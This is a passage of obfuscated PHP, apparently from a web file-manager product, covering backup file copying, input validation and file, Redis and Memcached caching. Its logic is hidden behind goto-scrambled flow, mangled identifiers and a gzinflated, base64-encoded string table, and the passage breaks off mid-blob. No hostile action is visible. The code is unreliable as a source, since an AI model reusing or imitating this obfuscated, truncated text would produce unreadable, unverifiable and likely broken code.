$DÛÉ‡∏Èµπ; break; case $a…§È¡È√¶[1884]: return floatval($B∆∫æ´ûä∂) < $DÛÉ‡∏Èµπ; break; case $a…§È¡È√¶[325]: return strlen($B∆∫æ´ûä∂) >= $DÛÉ‡∏Èµπ[0] && strlen($B∆∫æ´ûä∂) <= $DÛÉ‡∏Èµπ[1]; break; case $a…§È¡È√¶[325]: if (is_array($DÛÉ‡∏Èµπ)) { return strlen($B∆∫æ´ûä∂) >= $DÛÉ‡∏Èµπ[0] && strlen($B∆∫æ´ûä∂) <= $DÛÉ‡∏Èµπ[1]; break; } else { return strlen($B∆∫æ´ûä∂) == $DÛÉ‡∏Èµπ; break; } case $a…§È¡È√¶[321]: return floatval($B∆∫æ´ûä∂) >= $DÛÉ‡∏Èµπ[0] && floatval($B∆∫æ´ûä∂) <= $DÛÉ‡∏Èµπ[1]; break; } $eï“î±Æêé = self::reg(!1); $BàﬁÈ¥≤∂ã = isset($eï“î±Æêé[$BàﬁÈ¥≤∂ã]) ? $eï“î±Æêé[$BàﬁÈ¥≤∂ã] : $BàﬁÈ¥≤∂ã; if (substr($BàﬁÈ¥≤∂ã, 0, 1) != $a…§È¡È√¶[8]) { $BàﬁÈ¥≤∂ã = $a…§È¡È√¶[1885] . $BàﬁÈ¥≤∂ã . $a…§È¡È√¶[1886]; } return preg_match($BàﬁÈ¥≤∂ã, $B∆∫æ´ûä∂) === 1; } public static function get($dı≠ÿÊç∆∫, $cŒúÍìÉŒã = null, $F∑ûü•÷‡â = null, $FÇ≈πÙ®Øï = null) { goto B·Ÿπ˘⁄Ùù; B·Ÿπ˘⁄Ùù: $DæËŸŸ´⁄ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D‹¶Ééè°π = array(); if (!is_null($F∑ûü•÷‡â)) { $D‹¶Ééè°π[$DæËŸŸ´⁄ç[34]] = $F∑ûü•÷‡â; } goto eè∞êî¨∏°; eè∞êî¨∏°: if (!is_null($FÇ≈πÙ®Øï)) { $D‹¶Ééè°π[$DæËŸŸ´⁄ç[1016]] = $FÇ≈πÙ®Øï; } if (!is_null($cŒúÍìÉŒã)) { $D‹¶Ééè°π[$DæËŸŸ´⁄ç[1881]] = $cŒúÍìÉŒã; } $d‹∂Ω•îÜí = Input::getArray(array($dı≠ÿÊç∆∫ => $D‹¶Ééè°π)); goto bò∑¥‘¡å; bò∑¥‘¡å: return $d‹∂Ω•îÜí[$dı≠ÿÊç∆∫]; goto A»∫–ñÚ∂©; A»∫–ñÚ∂©: } } goto CéÑÎ ”ûÉ; a∫äåßë¬Ç: class BackupFile { public function __construct() { } public function index() { goto Aáì¢Ωßù„; Eö±ïÃõÊÓ: $D–Ï£Úÿ«Ï = $Cöà™∆õ≥Î = 0; do { $c∑æÙ„¢◊ö = $_SERVER[Ä¿¡‡öóµŸﬂ‡][749]; $dÙìùıµÈ¢ = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][727])->where($Dø¬çÕü›∫)->field($c∑æÙ„¢◊ö)->order($_SERVER[Ä¿¡‡öóµŸﬂ‡][750])->selectPage($e÷∑˘ï¬æœ, $cºËœ‚î»•); $DäŒÉ≤≥ƒ = !empty($dÙìùıµÈ¢[$_SERVER[Ä¿¡‡öóµŸﬂ‡][354]]) ? $dÙìùıµÈ¢[$_SERVER[Ä¿¡‡öóµŸﬂ‡][354]] : array(); foreach ($DäŒÉ≤≥ƒ as $c≠«úŒ‹çΩ) { goto eŒ∆⁄«õ´ú; Aé“ì∂≠ﬂí: if ($cõâäÕÍÕã >= 1024 * 1024 * 100) { $Aıﬂ£Ö€∑Ö = array($_SERVER[Ä¿¡‡öóµŸﬂ‡][756] => $Aœ“ëö‡Â›, $_SERVER[Ä¿¡‡öóµŸﬂ‡][757] => $Cöà™∆õ≥Î, $_SERVER[Ä¿¡‡öóµŸﬂ‡][758] => $D–Ï£Úÿ«Ï); Backup::set($Aıﬂ£Ö€∑Ö); $cõâäÕÍÕã = $d‹Æå◊ÓóŸ = 0; } goto Aº––éâÜ¨; E¢◊Áã´äŸ: if (IO::exist($a˜˜≤ ‘Û„)) { $aàü‰†¬ÿ–->updateFileEnd($c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][28]], $c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]]); } else { $a˜˜≤ ‘Û„ = get_path_father($a˜˜≤ ‘Û„); IO::mkdir($a˜˜≤ ‘Û„); if (!IO::copy($Dìê…ÖÜ™Ö, $a˜˜≤ ‘Û„, $_SERVER[Ä¿¡‡öóµŸﬂ‡][753])) { write_log($_SERVER[Ä¿¡‡öóµŸﬂ‡][754] . $Dìê…ÖÜ™Ö . $_SERVER[Ä¿¡‡öóµŸﬂ‡][755] . $a˜˜≤ ‘Û„ . $_SERVER[Ä¿¡‡öóµŸﬂ‡][476], $_SERVER[Ä¿¡‡öóµŸﬂ‡][722]); $aúìÇ∞Ûòú = !1; break; } } $Aœ“ëö‡Â› = $c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][419]]; $d‹Æå◊ÓóŸ += 1; goto e•ÚÕ——¶«; eŒ∆⁄«õ´ú: if (!$this->_fileExist($c≠«úŒ‹çΩ, $AÁ´ó—Ç°Ã, $AÕπëÑìïú)) { $FøçπÓÃ≈‚ -= 1; $Cóπö”¥ìà -= (int) $c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]]; write_log("\146\x69\154\145\x20\x6e\157\x74\x20\145\x78\151\163\x74\56\146\x69\154\x65\x49\104\72{$c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][419]]}\54\40\160\141\x74\x68\72{$c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]]}", $_SERVER[Ä¿¡‡öóµŸﬂ‡][751]); continue; } $Dìê…ÖÜ™Ö = $c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]]; $a˜˜≤ ‘Û„ = "\173\151\157\72{$EÖæΩ ëﬂ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][691]]}\x7d" . substr($Dìê…ÖÜ™Ö, strlen("\173\x69\157\72{$c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][752]]}\x7d")); goto E¢◊Áã´äŸ; e•ÚÕ——¶«: $cõâäÕÍÕã += $c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]]; $Cöà™∆õ≥Î += 1; $D–Ï£Úÿ«Ï += $c≠«úŒ‹çΩ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]]; goto Aé“ì∂≠ﬂí; Aº––éâÜ¨: } $bØÜà∫ƒ¿À = count($DäŒÉ≤≥ƒ); $cºËœ‚î»•++; } while ($bØÜà∫ƒ¿À == $e÷∑˘ï¬æœ); $aàü‰†¬ÿ–->end(); goto BπŒÜ∑ƒ≈Ô; aóôƒ´î∫ë: $aúìÇ∞Ûòú = !0; $AÕπëÑìïú = $this->storeIds(); $cºËœ‚î»• = 1; goto a¿úè∞°ùÌ; BπŒÜ∑ƒ≈Ô: $Bƒ‡Û”®§Ñ = $aúìÇ∞Ûòú ? 1 : 0; $Aıﬂ£Ö€∑Ö = array($_SERVER[Ä¿¡‡öóµŸﬂ‡][759] => 1, $_SERVER[Ä¿¡‡öóµŸﬂ‡][703] => time(), $_SERVER[Ä¿¡‡öóµŸﬂ‡][709] => $Bƒ‡Û”®§Ñ, $_SERVER[Ä¿¡‡öóµŸﬂ‡][756] => $Aœ“ëö‡Â›, $_SERVER[Ä¿¡‡öóµŸﬂ‡][748] => $Cóπö”¥ìà, $_SERVER[Ä¿¡‡öóµŸﬂ‡][747] => $FøçπÓÃ≈‚); if ($d‹Æå◊ÓóŸ) { $Aıﬂ£Ö€∑Ö[$_SERVER[Ä¿¡‡öóµŸﬂ‡][757]] = $Cöà™∆õ≥Î; $Aıﬂ£Ö€∑Ö[$_SERVER[Ä¿¡‡öóµŸﬂ‡][758]] = $D–Ï£Úÿ«Ï; } goto dô™„∆Æﬂÿ; Aáì¢Ωßù„: $EÖæΩ ëﬂ = Backup::get(); $Aœ“ëö‡Â› = $EÖæΩ ëﬂ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][281]][$_SERVER[Ä¿¡‡öóµŸﬂ‡][167]][$_SERVER[Ä¿¡‡öóµŸﬂ‡][419]]; $Dø¬çÕü›∫ = array($_SERVER[Ä¿¡‡öóµŸﬂ‡][420] => array($_SERVER[Ä¿¡‡öóµŸﬂ‡][743], $Aœ“ëö‡Â›), $_SERVER[Ä¿¡‡öóµŸﬂ‡][744] => array($_SERVER[Ä¿¡‡öóµŸﬂ‡][319], $EÖæΩ ëﬂ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][691]])); goto aé≠≤≈«Öã; aé≠≤≈«Öã: $FøçπÓÃ≈‚ = (int) Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][727])->where($Dø¬çÕü›∫)->count($_SERVER[Ä¿¡‡öóµŸﬂ‡][419]); $Cóπö”¥ìà = (int) Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][727])->where($Dø¬çÕü›∫)->sum($_SERVER[Ä¿¡‡öóµŸﬂ‡][77]); $aàü‰†¬ÿ– = new TaskFileTransfer($_SERVER[Ä¿¡‡öóµŸﬂ‡][745], $_SERVER[Ä¿¡‡öóµŸﬂ‡][722], $FøçπÓÃ≈‚, LNG($_SERVER[Ä¿¡‡öóµŸﬂ‡][723]) . $_SERVER[Ä¿¡‡öóµŸﬂ‡][724] . LNG($_SERVER[Ä¿¡‡öóµŸﬂ‡][746])); goto b¢èçΩÓÿ‰; dô™„∆Æﬂÿ: Backup::set($Aıﬂ£Ö€∑Ö); $this->_fileFilter($AÁ´ó—Ç°Ã); return !0; goto AµÈèÇˆ‡ﬁ; a¿úè∞°ùÌ: $e÷∑˘ï¬æœ = 1000; $cõâäÕÍÕã = $d‹Æå◊ÓóŸ = 0; $AÁ´ó—Ç°Ã = array(); goto Eö±ïÃõÊÓ; b¢èçΩÓÿ‰: $aàü‰†¬ÿ–->task[$_SERVER[Ä¿¡‡öóµŸﬂ‡][698]] = $Cóπö”¥ìà; $Aıﬂ£Ö€∑Ö = array($_SERVER[Ä¿¡‡öóµŸﬂ‡][747] => $FøçπÓÃ≈‚, $_SERVER[Ä¿¡‡öóµŸﬂ‡][748] => $Cóπö”¥ìà); Backup::set($Aıﬂ£Ö€∑Ö); goto aóôƒ´î∫ë; AµÈèÇˆ‡ﬁ: } private function _fileExist($cÏÕÆ∆¥ää, &$eÛõ≠ä∫ùæ, $füæ⁄Ÿ•ÔÏ) { goto b¶Ì’é‚Ê÷; FÍ´”§Øìá: $eÛõ≠ä∫ùæ = array_merge($eÛõ≠ä∫ùæ, array_to_keyvalue($a∆≠ÈºŒùµ, $F√À‹Œ∫ÿÔ[33], $F√À‹Œ∫ÿÔ[419])); return !1; goto aÑ⁄®Úé˘Ÿ; EÂãä∂⁄Øù: if (IO::exist($e–∑í£≥ª◊)) { $eÛõ≠ä∫ùæ[] = $cÏÕÆ∆¥ää[$F√À‹Œ∫ÿÔ[419]]; return !1; } $aŸ⁄øïÔî— = array($F√À‹Œ∫ÿÔ[752] => $cÏÕÆ∆¥ää[$F√À‹Œ∫ÿÔ[752]], $F√À‹Œ∫ÿÔ[75] => array($F√À‹Œ∫ÿÔ[760], "{$e–∑í£≥ª◊}\45")); $a∆≠ÈºŒùµ = Model($F√À‹Œ∫ÿÔ[727])->where($aŸ⁄øïÔî—)->field($F√À‹Œ∫ÿÔ[420])->select(); goto FÍ´”§Øìá; b¶Ì’é‚Ê÷: $F√À‹Œ∫ÿÔ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bä•πô·Âß = $cÏÕÆ∆¥ää[$F√À‹Œ∫ÿÔ[75]]; if (in_array($cÏÕÆ∆¥ää[$F√À‹Œ∫ÿÔ[419]], $eÛõ≠ä∫ùæ)) { return !1; } goto EäÃ˜ÂÒ¿Ë; EäÃ˜ÂÒ¿Ë: if (!in_array($cÏÕÆ∆¥ää[$F√À‹Œ∫ÿÔ[752]], $füæ⁄Ÿ•ÔÏ)) { return !1; } if (IO::exist($bä•πô·Âß)) { return !0; } $e–∑í£≥ª◊ = get_path_father($bä•πô·Âß); goto EÂãä∂⁄Øù; aÑ⁄®Úé˘Ÿ: } private function _fileFilter($EµÀ”π˘®…) { $e”„±ŒëÕ∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($EµÀ”π˘®…)) { return; } $bô∫å˜¢ë∫ = array($e”„±ŒëÕ∂[419] => array($e”„±ŒëÕ∂[7], array_unique($EµÀ”π˘®…))); $BáßëµΩ¢° = Model($e”„±ŒëÕ∂[761])->where($bô∫å˜¢ë∫)->field($e”„±ŒëÕ∂[369])->select(); foreach ($BáßëµΩ¢° as $F‡◊Ã¿£êË) { Model($e”„±ŒëÕ∂[761])->remove($F‡◊Ã¿£êË[$e”„±ŒëÕ∂[369]], !1); } } private function storeIds() { $d•êµ‡À ¢ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D©à†¶§‰± = Model($d•êµ‡À ¢[704])->listData(); $eúô≈é‚º = array(); $EõÏäæ∆†´ = $GLOBALS[$d•êµ‡À ¢[6]][$d•êµ‡À ¢[84]][$d•êµ‡À ¢[762]]; foreach ($D©à†¶§‰± as $B¯›◊ëìÌó) { $AèÜõõ‹Îî = strtolower($B¯›◊ëìÌó[$d•êµ‡À ¢[90]]); if (!isset($EõÏäæ∆†´[$AèÜõõ‹Îî])) { continue; } $cìÒ´Ü‡´“ = $d•êµ‡À ¢[71] . (isset($EõÏäæ∆†´[$AèÜõõ‹Îî]) ? $EõÏäæ∆†´[$AèÜõõ‹Îî] : ucfirst($AèÜõõ‹Îî)); if (!class_exists($cìÒ´Ü‡´“)) { continue; } $eúô≈é‚º[] = $B¯›◊ëìÌó[$d•êµ‡À ¢[367]]; } return $eúô≈é‚º; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto eëóì≤ç’ä; AËÍ≤Ú€â™: switch ($fÓŒŸâÔùÏ[$Eñ¡«π•≈œ[763]]) { case $Eñ¡«π•≈œ[17]: self::$handle = Model($Eñ¡«π•≈œ[765]); break; case $Eñ¡«π•≈œ[766]: self::$handle = new CacheRedis($fÃò¥⁄ºí∑, $d∏È·Ô∆ôû); break; case $Eñ¡«π•≈œ[767]: self::$handle = new CacheMemcached($fÃò¥⁄ºí∑, $d∏È·Ô∆ôû); break; case $Eñ¡«π•≈œ[167]: self::$handle = new CacheFile($fÃò¥⁄ºí∑, $d∏È·Ô∆ôû); break; default: break; } return self::$handle; goto déøï¥∞Ûä; eëóì≤ç’ä: $Eñ¡«π•≈œ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto FÑˆÖ´¢ëé; FÑˆÖ´¢ëé: $fÓŒŸâÔùÏ = $GLOBALS[$Eñ¡«π•≈œ[6]][$Eñ¡«π•≈œ[337]]; $fÃò¥⁄ºí∑ = $fÓŒŸâÔùÏ[$fÓŒŸâÔùÏ[$Eñ¡«π•≈œ[763]]]; $d∏È·Ô∆ôû = $fÓŒŸâÔùÏ[$Eñ¡«π•≈œ[764]]; goto AËÍ≤Ú€â™; déøï¥∞Ûä: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($D◊⁄„¬äå÷) { if (is_array($D◊⁄„¬äå÷) || is_object($D◊⁄„¬äå÷)) { $D◊⁄„¬äå÷ = json_encode($D◊⁄„¬äå÷); } $D◊⁄„¬äå÷ = rawurlencode($D◊⁄„¬äå÷); return KOD_SITE_ID . $_SERVER[Ä¿¡‡öóµŸﬂ‡][70] . $D◊⁄„¬äå÷; } public static function get($bùÿë®À∏) { $A≈ù™¯“¶Á = self::key($bùÿë®À∏); if (!isset(self::$memoryCache[$A≈ù™¯“¶Á])) { $fÜ„‚∏†”Ω = self::init()->get($A≈ù™¯“¶Á); self::$memoryCache[$A≈ù™¯“¶Á] = unserialize($fÜ„‚∏†”Ω); } return self::$memoryCache[$A≈ù™¯“¶Á]; } public static function set($B„Î‘µ˜Œ¥, $bÛæéìÇéô, $C«–ñπéæé = false) { goto Eœéóﬂ˜áù; f‡á∏∆◊»à: CacheLock::unlock($B„Î‘µ˜Œ¥); return $EÏÖ·çÈÙß; goto a°Óà§º¶Ù; D⁄ø‰áÇ€õ: CacheLock::lock($B„Î‘µ˜Œ¥); $EÏÖ·çÈÙß = self::init()->set($F¡•º¢ÍÍ“, serialize($bÛæéìÇéô), $C«–ñπéæé); self::$memoryCache[$F¡•º¢ÍÍ“] = $bÛæéìÇéô; goto f‡á∏∆◊»à; Eœéóﬂ˜áù: $F¡•º¢ÍÍ“ = self::key($B„Î‘µ˜Œ¥); if (isset(self::$memoryCache[$F¡•º¢ÍÍ“]) && self::$memoryCache[$F¡•º¢ÍÍ“] === $bÛæéìÇéô) { return !0; } if ($C«–ñπéæé === 0) { self::$memoryCache[$F¡•º¢ÍÍ“] = $bÛæéìÇéô; return !0; } goto D⁄ø‰áÇ€õ; a°Óà§º¶Ù: } public static function remove($d´ó≥Ç‰∏ã) { goto B˘Ãÿ«≠›É; d—É∆Îãîÿ: CacheLock::lock($d´ó≥Ç‰∏ã); $E·Á√Òòë = self::init()->remove($A‹”À√‹üÈ); CacheLock::unlock($d´ó≥Ç‰∏ã); goto b∏Òà ÒøÕ; b∏Òà ÒøÕ: return $E·Á√Òòë; goto Fí›”¥û∆õ; B˘Ãÿ«≠›É: $A‹”À√‹üÈ = self::key($d´ó≥Ç‰∏ã); unset(self::$memoryCache[$A‹”À√‹üÈ]); self::clearTimeout(); goto d—É∆Îãîÿ; Fí›”¥û∆õ: } public static function clearMemory($AˆåâÂ°◊ı = false) { if ($AˆåâÂ°◊ı) { $AˆåâÂ°◊ı = self::key($AˆåâÂ°◊ı); unset(self::$memoryCache[$AˆåâÂ°◊ı]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ä¿¡‡öóµŸﬂ‡][768])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ä¿¡‡öóµŸﬂ‡][769])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($f¿Ï•ó‘Ê´, $DÈéÒµÖÛí) { $bâü§ÃÖŒÀ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->cachePath = $f¿Ï•ó‘Ê´[$bâü§ÃÖŒÀ[75]]; $this->prefix = $bâü§ÃÖŒÀ[770]; $this->cacheTime = $DÈéÒµÖÛí; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($b•Ñƒóåê≥) { $Däﬂ”ÚºÃæ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b•Ñƒóåê≥ = str_replace(array($Däﬂ”ÚºÃæ[771], $Däﬂ”ÚºÃæ[93], $Däﬂ”ÚºÃæ[69]), $Däﬂ”ÚºÃæ[772], $b•Ñƒóåê≥); return $this->cachePath . $Däﬂ”ÚºÃæ[773] . $b•Ñƒóåê≥ . $Däﬂ”ÚºÃæ[774]; } public function set($cõòΩﬁµª©, $c‚°≠ﬁèâã, $DÍ´ùÑÊÎÃ = false) { $A‡≥∆ÜÕ¡ì = $this->getFile($cõòΩﬁµª©); if (file_put_contents($A‡≥∆ÜÕ¡ì, $this->prefix . $c‚°≠ﬁèâã, LOCK_EX)) { return !0; } @unlink($A‡≥∆ÜÕ¡ì); return !1; } public function get($BÁæ¥œ†¨Ò) { $e∫Úß€à·° = $this->getFile($BÁæ¥œ†¨Ò); if (file_exists($e∫Úß€à·°) && filemtime($e∫Úß€à·°) < time() - $this->cacheTime) { @unlink($e∫Úß€à·°); return !1; } $eΩ¢Ì›§·… = @file_get_contents($e∫Úß€à·°); return substr($eΩ¢Ì›§·…, strlen($this->prefix)); } public function remove($a»Ó¢‹€›‹) { $d≠⁄∞Ñ£‘¡ = $this->getFile($a»Ó¢‹€›‹); return @unlink($d≠⁄∞Ñ£‘¡); } public function deleteAll() { $D¡µ¥©é∑Î =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EØ∑ÿ®ä¬„ = scandir($this->cachePath); foreach ($EØ∑ÿ®ä¬„ as $aÀŸÜÒ™ãì) { $c⁄Òïˆ–ã« = $this->cachePath . $aÀŸÜÒ™ãì; if (strpos($c⁄Òïˆ–ã«, $D¡µ¥©é∑Î[774]) && strpos($c⁄Òïˆ–ã«, $D¡µ¥©é∑Î[775])) { @unlink($c⁄Òïˆ–ã«); } } } public function clearTimeout() { $B˜àÀ¡òﬂˆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D»º”öçÆ‡ = scandir($this->cachePath); foreach ($D»º”öçÆ‡ as $e°ÖÇàüµ‚) { $cΩŒÙ°ïﬂª = $this->cachePath . $e°ÖÇàüµ‚; if (strpos($cΩŒÙ°ïﬂª, $B˜àÀ¡òﬂˆ[774]) && strpos($cΩŒÙ°ïﬂª, $B˜àÀ¡òﬂˆ[775]) && filemtime($cΩŒÙ°ïﬂª) < time() - $this->cacheTime) { @unlink($cΩŒÙ°ïﬂª); } } } } goto F©‰òªê◊ø; cä√ß≠ÿ≤ç: if (!function_exists('_kodDe')) { function _kodDe($FÚï©∂≥Á˜) { $FÚï©∂≥Á˜ = base64_decode($FÚï©∂≥Á˜); $CÛÉà®Ø„¥ = strlen($FÚï©∂≥Á˜); $Cø‡°Î·ù° = ''; $AûÒŸ™’Û∆ = ord($FÚï©∂≥Á˜[0]) - 30; for ($B‰¡ﬁ™“„Ã = 1; $B‰¡ﬁ™“„Ã < $CÛÉà®Ø„¥; $B‰¡ﬁ™“„Ã += 2) { if ($B‰¡ﬁ™“„Ã + 1 < $CÛÉà®Ø„¥) { $Cø‡°Î·ù° .= chr(ord($FÚï©∂≥Á˜[$B‰¡ﬁ™“„Ã + 1]) + $AûÒŸ™’Û∆); $Cø‡°Î·ù° .= chr(ord($FÚï©∂≥Á˜[$B‰¡ﬁ™“„Ã]) + $AûÒŸ™’Û∆); } else { $Cø‡°Î·ù° .= chr(ord($FÚï©∂≥Á˜[$B‰¡ﬁ™“„Ã]) + $AûÒŸ™’Û∆); } } return $Cø‡°Î·ù°; } } define("\200\300\301\340\232\227\265\331\337\340", "\xba\xcf\xab\x84\xd4\xc1\xf2\x9b"); $_SERVER[Ä¿¡‡öóµŸﬂ‡] = explode("\174\2\174\3\174\5", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x3d\x7\x7c\x5b\xc5\xf9\x94\x4d\xa\x5\xca\xee\x7c\x38\x4\x8f\x68\x78\x66\x38\xb6\x13\xd9\x96\x6d\x25\xb2\x65\x24\x39\x4e\x62\x19\xe5\x49\x7a\x92\x5e\x2c\xe9\xc9\xef\x3d\xc9\x23\x9".base64_decode('LYQNYe+9ZwjQlL1XKG0pUChlNhBIQlhlFCij8L99955kaP/8cHT33Xf3bnz33Xd33/fdtpdPfmbd')."\252\35\127\355\264\152\227\77\237\177\6\16\200\277\235\126\375\10\207\177\175\312\356\73\240\377\166\312\36\161\304\242\307\152\367\351\132\365\351\340\373\117\125\276\374\360\27\207\136\174\361\372\253\336\273\355\211"."\276\175\333\317\173\355\305\333\34\7\235\265\377\11\377\176\353\226\373\314\133\342\373\353\233\272\377\171\337\327\37\236\366\237\310\213\233\236\370\361\302\147\167\336\345\242\73\136\331\347\274\226\217\16\370\142\101".strrev('Ì9ü’¢‰p:‡=æóCwÎ±æ/ï»ˆ^ÔÛ⁄Ù˛Óe;ÎÏ≈ù˜ÛææF3wzoûıq]ﬁGÅï¡f').strrev('<◊y˛¡s˚≤∂˝”<Ô‘t\\_â“ÁÁ∏º«£˝Ò‰{õòøo˚Kv˚mªﬂ€≥›wC#ØÛ4_ç')."\x7e\xc8\xa1\xe7\x54\xed\x31\xbf\xef\xd3\xfd\x3e\x18\x6e\x58\x77\x6c\xf1\x81\x63\x7f\xb7\x74\xd9\x6d\xd7\x3b\x2e\xdd\x30\x71\xd1\x86\xed\xf5\x27\xbd\x72\xc0\xba\xe7\x3c\x8b\x17\x7b\x36\xf\x5e\x32\xd1\xf2\xc7\xb3\x56\xde\x79\xf0"."\x96\x86\xcd\xcf\x3c\x75\x41\xef\x59\x83\x15\x7b\x17\x7c\xaf\x5f\x7c\xe7\xca\xaa\xbb\x1b\xfe\xf8\xf8\xca\xe4\x23\xd5\xfb\x3e\xf0\x97\xba\xaa\x7d\xd7\xfa\x1f\x6e\xde\xa7\x65\xc1\xbf\x8e\xea\x38\xfa\xe3\x3b\xfe\x9a\x6f\x79\xef\xb7"."\x83\x3f\x6a\xd2\x5f\xfe\xd5\xdb\x71\xf5\x96\xbb\x57\x7f\x7a\xff\xf8\xaf\x8b\x4d\x17\x7e\x75\xbc\xb1\x9f\x79\xea\xc4\xee\x9f\x5d\xb6\xcb\x4b\x57\x3c\x7b\xdb\x59\x3f\x5f\x7a\xf9\x77\x97\x6c\xad\xd\x76\xbf\x54\xec\xd9\xdc\x75\x67".base64_decode('1QG/qtz5wZmR7EGRs77dcXJ17IpNO+6wA+7nZvwj5TRTUsZVwzQwIK7lkmoKh9Uc/nXjH2M0o5oK').base64_decode('Dkf7AuFoaKC/3xsMR0mJYnpWS5BQXtblLCk8r+gG+JRYXDSv5ZWcBcIBCdmUY7JBSupsj3Z6+/2B').base64_decode('pdHw0n4vwYhFRwuKPoFjKBgyZd0Mq1mFYYzprF7t3m5fnxQOevpCno6wL9CHwR2B3l5fuBQeDPj9')."\xed\x9e\x8e\x45\xa5\x29\xfd\x41\x4f\x77\xaf\x47\x2\xf5\xcb\x28\x51\x35\x97\xd4\xaa\xa4\xe5\x38\x65\xb9\x54\x8d\x3\x5d\xaa\x92\x49\xe0\x60\x4e\xa6\xd5\x31\x27\xf2\x24\x14\x66\x21\x30\x6\xb9\x42\x26\x83\x23\x7d\x2c\x44\xea\xaf"."\44\345\102\206\364\131\247\30\311\353\152\126\246\115\137\244\114\60\50\16\310\5\123\123\163\161\34\361\216\233\272\314\341\240\306\161\135\311\52\71\122\124\310\353\367\166\204\45\130\115\251\53\30\350\225\310\120"."\144\145\303\124\164\151\260\307\33\364\112\260\352\255\225\250\305\225\22\316\67\320\7\72\104\362\370\375\322\124\45\230\112\66\117\213\301\171\312\24\26\10\166\172\203\122\373\122\211\367\123\134\313\146\265\234\13".base64_decode('lALG0xSq6g0GccBBKNjvg0NHIoGurpCXxUjjjvCDmjQQKrXEEsmMGS3KmQIl1hH8W0l+yK9mEAIe').base64_decode('VXNqgRArKULT2MwhgQLFVigkC7JpZE6BCVbEwdY2/DuPIMWiME3RzaiSi2sJNUem4Xwy5QjhyWa6')."\123\127\1\36\51\120\163\305\265\374\104\257\126\44\155\110\252\31\305\317\146\131\122\313\44\24\235\307\363\40\273\230\102\32\243\116\12\271\373\12\131\21\205\105\343\151\65\223\320\351\344\374\76\314\72\122\254".strrev('ø;GCU\\aËB~Ña&P:Ωêz@vœM.¥ ,¶'."\n".'≈Ôµ¢êâ…£>@È≠†öb')."\x5a\x0\xfe\xa9\x26\x5c\x2c\x42\xaa\x96\x56\x32\x99\xa8\x32\xae\x90\x9\x92\x4d\x34\x19\xb4\xf6\x6e\x23\xa6\xe6\xdc\x0\x82\xa3\xbe\x40\x34\x2d\x1b\xe9\xde\x44\x53\x14\xe5\xa2\xcc\x31\xa1\x8c\xbb\xf2\xe9\x3c\x99\xc3\x6c\xda\x46"."\x2c\x4\xc\xfb\xbb\x4f\x33\xbd\x2\x8b\xcd\x68\x71\x39\x23\xb6\x14\x87\xd3\xa6\x99\xf\x29\xb9\x4\xec\x10\xd2\x22\x6d\x2c\x87\x3a\x2c\xaf\x28\x4\xa9\xd3\x21\x25\xa4\x5e\x69\xa9\xd4\xd3\xac\x36\x53\xea\x2\xb4\x92\x9c\xe0\x1c"."\x2f\x6d\x66\x33\x2c\x44\x5b\xcb\x60\x6\x3\x9a\xe3\x84\x26\x2a\x48\x5c\x19\x37\x49\x27\x49\xf3\xe2\x69\x59\x7\xc3\xd7\x5a\x30\x93\xce\x39\x84\x71\xe4\xf3\x19\x35\x2e\x9b\xaa\x96\x73\x6b\x71\x53\x31\x9d\x86\xa9\x2b\x32\x29\xad".base64_decode('Yp4EKQLO4Bqci86eDi1ngunrDOtyzkgqutNLyLtZAv3MOBhF61SNvGao8DPNkmyacjwNZz8vvvV7')."\360\325\134\106\315\51\45\270\236\170\134\61\14\47\314\242\153\31\247\47\223\321\306\234\1\135\115\251\40\117\215\255\232\200\63\65\113\224\155\346\125\135\61\150\124\352\356\15\23\144\120\53\305\331\257\313\251"."\xac\xdc\x2c\xe5\xb\x31\xd0\x33\x64\x7e\x96\x81\x61\x6c\xf2\xf5\x66\x29\xe\xa3\xe\x29\x5b\x30\x4c\xa7\xae\x0\xf6\xa3\x82\x85\x8e\xc\x9e\x2f\xe9\xec\x85\xe3\xa9\x2a\x9\x67\x8\x70\x69\x2\x6e\xa8\x6d\x94\x0\x19\x49\x34\xd"."\103\173\302\341\376\250\257\13\54\306\175\336\150\257\47\334\321\103\252\155\312\51\132\147\77\340\275\254\110\12\134\342\4\123\16\22\132\37\350\43\16\354\327\306\24\35\174\270\175\242\131\32\321\22\61\155\334"."\x45\x93\x20\x72\x8\x70\x9\x8a\xc\x7b\x34\x6f\x3a\x83\x72\x2e\x5\xfb\x27\x36\x61\x2a\x84\x1c\x